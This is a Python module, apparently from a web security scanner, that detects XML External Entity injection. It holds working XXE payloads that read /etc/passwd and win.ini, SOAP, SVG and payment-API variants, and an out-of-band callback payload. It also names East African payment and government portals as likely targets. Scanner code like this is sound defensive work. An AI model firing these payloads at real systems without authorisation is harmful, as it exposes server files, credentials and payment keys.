"""
xxe.py — XML External Entity (XXE) Injection Detector

Covers:
  - Classic XXE: inline entity reading /etc/passwd or Windows system files
  - Blind XXE: OOB DNS/HTTP exfiltration indicators
  - XXE via file upload (SVG, DOCX, XLSX — common in EA document portals)
  - SSRF via XXE (use external entity to probe internal services)

EA context:
  DPO Group PayGate and legacy Airtel Money APIs accept XML request bodies.
  Government portals (URA, NSSF) often process uploaded XML/XLSX documents.
  SOAP-based integrations for T24 Temenos banking core.
"""

from __future__ import annotations

from typing import List

from core.detection.base_detector import BaseDetector, DetectorMeta, Payload
from core.models.finding import VulnType

_CVSS_XXE_READ  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"  # 8.6
_CVSS_XXE_BLIND = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"  # 6.5

# Linux/Windows file read evidence
_FILE_READ_PATTERN = r"(?i)(root:.*:/bin|nobody:.*:/|daemon:.*:/|WINDOWS\\system32|boot\.ini|etc/passwd)"
_XML_ERROR_PATTERN = r"(?i)(xml.*error|parse.*error|DOCTYPE|entity.*not.*allowed|external.*entity|SAXParseException)"


class XXEDetector(BaseDetector):

    @property
    def meta(self) -> DetectorMeta:
        return DetectorMeta(
            detector_id="xxe",
            name="XML External Entity Injection",
            description="Detects XXE via XML body, file upload, and SOAP endpoints",
            vuln_types=[VulnType.XXE],
            owasp_categories=["A05:2021 – Security Misconfiguration"],
            estimated_requests_per_endpoint=6,
        )

    @property
    def payloads(self) -> List[Payload]:
        return [
            # ── Classic file-read XXE ──────────────────────────────────────────
            Payload(
                value=(
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<root><data>&xxe;</data></root>'
                ),
                description="Classic XXE — Linux /etc/passwd file read",
                evidence_pattern=_FILE_READ_PATTERN,
                false_positive_pattern=r"(?i)(DOCTYPE not allowed|external entity.*disabled|XXE.*blocked)",
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_READ,
                confidence_boost=0.45,
            ),
            Payload(
                value=(
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
                    '<root><data>&xxe;</data></root>'
                ),
                description="Classic XXE — Windows win.ini file read",
                evidence_pattern=r"(?i)(\[fonts\]|\[extensions\]|for 16-bit app support)",
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_READ,
                confidence_boost=0.45,
            ),
            # ── DPO PayGate / Airtel XML API specific ─────────────────────────
            Payload(
                value=(
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE API [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<API version="v6"><Request>&xxe;</Request></API>'
                ),
                description="XXE in DPO PayGate-style XML API envelope",
                evidence_pattern=_FILE_READ_PATTERN,
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_READ,
                confidence_boost=0.45,
            ),
            # ── SOAP-envelope XXE (T24 Temenos / NSSF) ────────────────────────
            Payload(
                value=(
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>'
                ),
                description="XXE in SOAP envelope (T24 banking core / government SOAP APIs)",
                evidence_pattern=_FILE_READ_PATTERN,
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_READ,
                confidence_boost=0.45,
            ),
            # ── Error-based XXE detection ──────────────────────────────────────
            Payload(
                value=(
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM'
                    ' "http://INVALID_HOST_FOR_XXE_DETECTION.local/"> %xxe;]><foo/>'
                ),
                description="Parameter entity fetch — triggers DNS/HTTP if XXE enabled",
                evidence_pattern=_XML_ERROR_PATTERN,
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_BLIND,
                confidence_boost=0.3,
            ),
            # ── SVG XXE (file upload endpoints) ───────────────────────────────
            Payload(
                value=(
                    '<?xml version="1.0" standalone="yes"?>'
                    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<svg xmlns="http://www.w3.org/2000/svg">'
                    '<text>&xxe;</text></svg>'
                ),
                description="SVG file upload XXE",
                evidence_pattern=_FILE_READ_PATTERN,
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_READ,
                confidence_boost=0.4,
            ),
            # ── Out-of-band (OOB) XXE ─────────────────────────────────────────
            Payload(
                value=(
                    '<?xml version="1.0" ?>'
                    '<!DOCTYPE root [<!ENTITY % remote SYSTEM "{{OOB_URL}}"> %remote;]>'
                    '<root/>'
                ),
                description="OOB XXE — parameter entity callback",
                evidence_pattern="",
                vuln_type=VulnType.XXE,
                cvss_vector=_CVSS_XXE_BLIND,
                confidence_boost=0.5,
                is_blind=True,
            ),
        ]

    async def detect(self, target, crawl_result, injector) -> list:
        findings = []
        from core.scanner.oob import oob_service

        # Only test endpoints that accept XML
        if not self._is_xml_endpoint(crawl_result):
            return findings

        # Inject into body-level parameters that carry XML
        for param in crawl_result.parameters:
            if param.location not in ("body", "json") and "xml" not in crawl_result.content_type.lower():
                continue

            for payload in self.payloads:
                # SVG payload only for file upload endpoints
                if "svg" in payload.description.lower() and "upload" not in crawl_result.url.lower():
                    continue

                # Handle OOB placeholders
                current_payload_value = payload.value
                oob_token = None
                if "{{OOB_URL}}" in current_payload_value:
                    oob_token = oob_service.generate_token(self.meta.detector_id)
                    current_payload_value = current_payload_value.replace(
                        "{{OOB_URL}}", oob_service.get_callback_url(oob_token)
                    )

                from core.detection.base_detector import Payload as PayloadObj
                test_payload = PayloadObj(
                    value=current_payload_value,
                    description=payload.description,
                    evidence_pattern=payload.evidence_pattern,
                    false_positive_pattern=payload.false_positive_pattern,
                    vuln_type=payload.vuln_type,
                    cvss_vector=payload.cvss_vector,
                    confidence_boost=payload.confidence_boost,
                    is_blind=payload.is_blind,
                )

                hit = await self._test_payload(injector, crawl_result, param, test_payload)
                if hit:
                    self._log_hit(self.meta.detector_id, crawl_result.url, param.name, payload.description)
                    ea_ctx = self._ea_context(crawl_result)
                    finding = self._build_finding(hit, ea_context=ea_ctx)
                    
                    if oob_token:
                        finding.oob_token = oob_token
                    
                    findings.append(finding)
                    break

        # Also try replacing the full body with XXE payloads on POST endpoints
        if crawl_result.method in ("POST", "PUT") and not findings:
            findings.extend(await self._test_body_replacement(injector, crawl_result))

        return findings

    async def _test_body_replacement(self, injector, crawl_result) -> list:
        """Send full XXE XML as the request body on POST/PUT endpoints."""
        from core.scanner.injector import InjectionRequest, PayloadEncoding
        import uuid
        from core.models.finding import Finding, FindingEvidence

        findings = []
        for payload in self.payloads[:3]:   # First 3 are most reliable
            req = InjectionRequest(
                url=crawl_result.url,
                method=crawl_result.method,
                parameter_name="__body__",
                parameter_location="body",
                original_value="",
                payload=payload.value,
                encoding=PayloadEncoding.PLAIN,
                content_type="application/xml",
            )
            resp = await injector.inject(req)
            if not resp.success:
                continue
            matched, matched_text = self._check_evidence(payload, resp.body, resp.elapsed_ms)
            if matched:
                evidence = FindingEvidence(
                    request_method=crawl_result.method,
                    request_url=crawl_result.url,
                    injected_parameter="request body",
                    injected_payload=payload.value[:200],
                    response_status=resp.status_code,
                    response_body_excerpt=self._safe_excerpt(resp.body, matched_text),
                    matched_pattern=payload.evidence_pattern,
                )
                from core.models.finding import Finding
                findings.append(Finding(
                    id=str(uuid.uuid4()),
                    url=crawl_result.url,
                    parameter_name="request_body",
                    parameter_location="body",
                    vuln_type=VulnType.XXE,
                    cvss_vector=payload.cvss_vector,
                    confidence=0.5 + payload.confidence_boost,
                    evidence=evidence,
                    evidence_pattern=payload.evidence_pattern,
                ))
                break
        return findings

    @staticmethod
    def _is_xml_endpoint(crawl_result) -> bool:
        """Is this endpoint likely to process XML input?"""
        xml_indicators = (
            "xml", "soap", "wsdl", "api", "upload",
            "import", "document", "file", "payload",
        )
        ct = crawl_result.content_type.lower()
        url = crawl_result.url.lower()
        return (
            "xml" in ct
            or any(ind in url for ind in xml_indicators)
            or crawl_result.method in ("POST", "PUT")
        )

    @staticmethod
    def _ea_context(crawl_result) -> dict:
        dpo_patterns = ("dpo", "3gdirectpay", "directpay", "paygate")
        airtel_patterns = ("airtel", "openapi.airtel")
        soap_patterns  = ("soap", "wsdl", "temenos", "t24", "nssf")
        url = crawl_result.url.lower()

        provider = None
        if any(p in url for p in dpo_patterns):
            provider = "dpo_group"
        elif any(p in url for p in airtel_patterns):
            provider = "airtel_money"

        return {
            "ea_relevant": any(
                p in url for p in dpo_patterns + airtel_patterns + soap_patterns
            ),
            "provider": provider,
            "attack_impact": (
                "XXE can expose server files including API credentials, "
                "payment keys, and database configuration."
            ),
            "max_regulatory_multiplier": 1.35,
        }